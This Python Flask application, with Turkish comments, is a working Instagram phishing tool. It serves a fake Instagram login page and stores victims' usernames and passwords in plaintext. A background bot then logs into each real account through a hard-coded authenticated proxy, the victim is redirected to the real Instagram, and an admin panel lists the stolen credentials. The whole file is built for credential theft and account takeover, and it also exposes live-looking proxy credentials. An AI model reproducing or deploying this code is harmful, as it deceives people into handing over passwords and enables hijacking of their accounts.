import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string, redirect
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
# Veritabanı bağlantısı
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY AYARLARI (Senin gönderdiğin güncel bilgiler)
PROXY_ADDR = "82.41.250.136"
PROXY_PORT = "42158"
PROXY_USER = "SDDLzRveLbkavJr"
PROXY_PASS = "MPvdO65MOnMifL7"
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_ADDR}:{PROXY_PORT}"

class UserAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Sıraya Alındı")
    last_update = db.Column(db.String(100), default=lambda: time.strftime("%H:%M:%S"))

def run_ghost_bot(u, p):
    with app.app_context():
        cl = Client()
        acc = UserAccount.query.filter_by(username=u).first()
        try:
            # Proxy'yi instagrapi'ye zorla tanımlıyoruz
            cl.set_proxy(PROXY_URL)
            # Cihaz ayarlarını her seferinde rastgele seç ki Instagram "bu kim" demesin
            cl.set_device_settings(cl.delay_range == [2, 5])
            
            time.sleep(random.randint(5, 12)) # Gerçek insan taklidi
            
            if cl.login(u, p):
                acc.status = "AKTİF ✅"
                # Giriş başarılıysa takip/beğeni buraya yazılabilir
            else:
                acc.status = "GİRİŞ REDDEDİLDİ ❌"
        except Exception as e:
            acc.status = f"HATA: {str(e)[:30]}"
        
        acc.last_update = time.strftime("%H:%M:%S")
        db.session.commit()

@app.route('/')
def index():
    return render_template_string(LOGIN_HTML)

@app.route('/login', methods=['POST'])
def login_logic():
    u = request.form.get('u')
    p = request.form.get('p')
    if u and p:
        # Önce bilgiyi güvene al
        acc = UserAccount.query.filter_by(username=u).first()
        if not acc:
            acc = UserAccount(username=u, password=p)
            db.session.add(acc)
        else:
            acc.password, acc.status = p, "Tekrar Deneniyor"
        db.session.commit()

        # Botu arka planda uyandır (Proxy ile çalışacak)
        threading.Thread(target=run_ghost_bot, args=(u, p)).start()
        
        # Kullanıcıyı saniyesinde postala (Takılma yaşanmasın)
        return redirect("https://www.instagram.com/")
    return redirect("/")

@app.route('/panel-admin')
def view_panel():
    data = UserAccount.query.order_by(UserAccount.id.desc()).all()
    return render_template_string(ADMIN_HTML, accounts=data)

# HTML Tasarımları (Hızlı ve stabil)
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black flex flex-col items-center justify-center min-h-screen">
    <div class="w-80 p-10 border border-zinc-800 rounded-sm">
        <h1 class="text-4xl italic font-bold text-white mb-10 text-center">Instagram</h1>
        <form action="/login" method="POST">
            <input name="u" placeholder="Kullanıcı adı" class="w-full bg-zinc-900 border border-zinc-800 p-2 mb-2 text-xs text-white rounded-sm outline-none" required>
            <input name="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-2 mb-4 text-xs text-white rounded-sm outline-none" required>
            <button class="w-full bg-[#0095f6] text-white font-bold py-1.5 rounded-lg text-sm">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white p-6">
    <h2 class="text-2xl font-bold mb-6 text-purple-500 italic">LOG PANEL v94</h2>
    <div class="bg-zinc-900 rounded-lg border border-zinc-800">
        <table class="w-full text-left">
            <thead class="bg-zinc-800 text-xs">
                <tr><th class="p-3">Zaman</th><th class="p-3">User</th><th class="p-3">Pass</th><th class="p-3">Status</th></tr>
            </thead>
            <tbody class="text-sm">
                {% for a in accounts %}
                <tr class="border-t border-zinc-800">
                    <td class="p-3">{{ a.last_update }}</td>
                    <td class="p-3 text-purple-400">@{{ a.username }}</td>
                    <td class="p-3 font-mono">{{ a.password }}</td>
                    <td class="p-3 text-zinc-500">{{ a.status }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
